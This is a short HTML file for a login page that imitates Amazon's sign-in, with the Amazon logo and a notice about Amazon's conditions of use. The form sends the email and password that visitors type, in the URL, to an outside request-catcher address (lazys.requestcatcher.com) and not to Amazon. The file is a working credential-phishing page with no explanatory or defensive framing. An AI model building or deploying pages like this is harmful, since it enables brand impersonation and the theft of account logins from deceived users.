<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css">
    <title>Document</title>
</head>
<body>
    <header>
        <div class="logo">
            <a href="amazon.html">
                <img src="img/Amazon_logo.svg.png" alt="logo">
            </a>
        </div>
    </header>
    <main>
        <div class="principal_content">
            <div id="login">
                <h1>Login</h1>
                <form action="https://lazys.requestcatcher.com/" method="get" id="form">
                    <input type="email" placeholder="email" name="email">
                    <input type="password" placeholder="Password" name="password">
                    <button type="submit">Login</button>
                    <p>
                        By continuing, you agree to <a href="#">Amazon's Conditions</a> of Use and<a href="#">Privacy Notice</a>.
                    </p>
                </form>
            </div>
            <div class="right_navbar">
                <a href="#">Sign In</a>
            </div>
        </div>
    </main>
</body>
</html>
